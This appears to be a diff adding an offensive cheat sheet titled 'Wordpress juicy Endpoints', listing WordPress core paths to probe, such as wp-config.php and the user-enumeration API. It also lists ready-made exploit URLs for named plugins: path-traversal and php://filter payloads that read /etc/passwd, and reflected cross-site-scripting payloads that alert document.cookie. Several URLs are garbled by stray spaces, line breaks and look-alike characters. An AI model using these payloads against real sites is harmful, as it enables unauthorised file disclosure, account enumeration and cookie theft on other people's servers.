@@ -1,0 +1,43 @@
+Wordpress juicy Endpoints :)
+
+/wp-admin. php
+/wp-config. php
+/wp-content/uploads
+/Wp-Load
+/wp-signup. php
+/Wp-json
+/wp-includes/
+/wp-login.php
+/wp-Links-opml. php
+/wp-activate.php
+/wp-blog-header. php
+/wp-cron. php
+/w-links. php
+/w-mail. php
+/xmrpc.php
+/wp-settings.php
+/wp-trackback.php
+/w-signup. php
+/admin-bar. php
+/wp-json/wp/v2/users
+
+
+/wp-content/plugins/./simple-image-manipulator/controller/ download.php?filepath=/etc/passwd
+/wp-content/plugins/activehelper-livehelp/server/offline.php?
+MESSAGE=MESSAGE%3C%2Ftextarea%3Е%3C%2Fscript%3Е%
+3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Е
+&DOMAINID=DOMAINID&COMPLETE=COMPLETE&TITLE=TITLE& URL=URL&COMPANY=COMPANY&SERVER=SERVER&PHONE=PH ONE&SECURITY=SECURITY&BCC=BCC&EMAIL=EMAIL%22%3Е%
+3Cscript%3Ealert%28document.cookie%29%3C/
+script%3&NAME=NAME%22%3%3Cscript%3Ealert%28docum
+ent.cookie%29%3C/script%3E&
+/wp-content/plugins/amministrazione-aperta/wpgov/
+dispatcher.php?open=.........................../etc/passwd
+/wp-content/plugins/anti-plagiarism/js.php? m=%3C%2Fscript%3%3Cscript%3Ealert%28document.domain
+%29%3C%2Fscript%3E
+/wp-content/plugins/buddypress-component-stats/lib/dompdf/ dompdf.php?input_file=php://filter/resource=/etc/passwd
+/wp-content/plugins/dzs-videogallery/admin/upload.php
+/wp-content/plugins/e-search/tmpl/title_az.php? title_az=%3C%2FsCript%3Е%3Cscript%3Ealert%28document.d
+omain%29%3C%2Fscript%3E
+/wp-content/plugins/fancy-product-designer/inc/custom-image-handler.php
+/wp-content/plugins/hd-webplayer/playlist.php
+/wp-content/plugins/localize-my-post/ajax/include.php?file=../../../../../../../../../../etc/passwd
